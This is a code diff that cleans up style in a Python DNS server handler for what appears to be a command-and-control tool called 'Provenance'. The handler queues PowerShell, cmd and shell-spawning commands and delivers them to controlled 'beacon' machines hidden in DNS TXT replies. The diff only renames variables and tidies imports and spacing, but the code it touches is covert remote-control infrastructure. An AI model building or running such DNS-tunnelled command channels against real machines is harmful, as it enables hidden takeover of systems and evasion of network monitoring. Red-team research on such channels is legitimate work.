@@ -1,19 +1,16 @@
 import dnslib
-from socketserver import UDPServer, BaseRequestHandler
-import threading
-import time
+from socketserver import BaseRequestHandler
+
 
 class IndividualClientHandler(BaseRequestHandler):
     """ This represents a machine being controlled by Provenance"""
-
     RR = {
         "TXT": (dnslib.QTYPE.TXT, dnslib.TXT)
     }
-
     command_type = {
         "NONE": 0,
         "POWERSHELL_EXECUTE": 1,
-        "CMD_EXECUTE" : 2,
+        "CMD_EXECUTE": 2,
         "SPAWN_SHELL": 3
     }
 
@@ -47,15 +44,15 @@ class IndividualClientHandler(BaseRequestHandler):
                     self.latest_request_confirmed = False
                     self.send_cmd(request)
                     self.latest_request_id = request.header.id
-        except dnslib.DNSError as e:
+        except dnslib.DNSError:
             print("[INFO] Incorrectly formatted DNS Query. Skipping")
 
     def get_data(self):
         return self.request[0].strip()
 
     """ Provenance Specific Functions"""
-    def queue_cmd(self, type, cmd):
-        self.queued_commands.append((self.command_type[type], cmd))
+    def queue_cmd(self, cmd_type, cmd):
+        self.queued_commands.append((self.command_type[cmd_type], cmd))
 
     def send_ack(self, request):
         ack = request.reply()
@@ -64,11 +61,11 @@ class IndividualClientHandler(BaseRequestHandler):
 
     def send_cmd(self, request):
         if self.queued_commands:
-            # TODO: use dictionary switch to encode different packets
             opcode, cmd = self.queued_commands.pop()
         else:
             opcode, cmd = ("NONE", "NONE")
 
+        # get the type of record this beacon is ready to receive
         rr_type, rr_constructor = self.RR[self.record_type]
         # Generate skeleton question for packet
         command_packet = request.reply() 
@@ -84,5 +81,4 @@ class IndividualClientHandler(BaseRequestHandler):
         socket = self.request[1]
         print(f"[INFO] Sending {self.command_type[opcode]} to {self.client_address}")
         socket.sendto(command_packet.pack(), self.client_address)
-        self.sent_commands.append((request.header.id,cmd))
-
+        self.sent_commands.append((request.header.id, cmd))
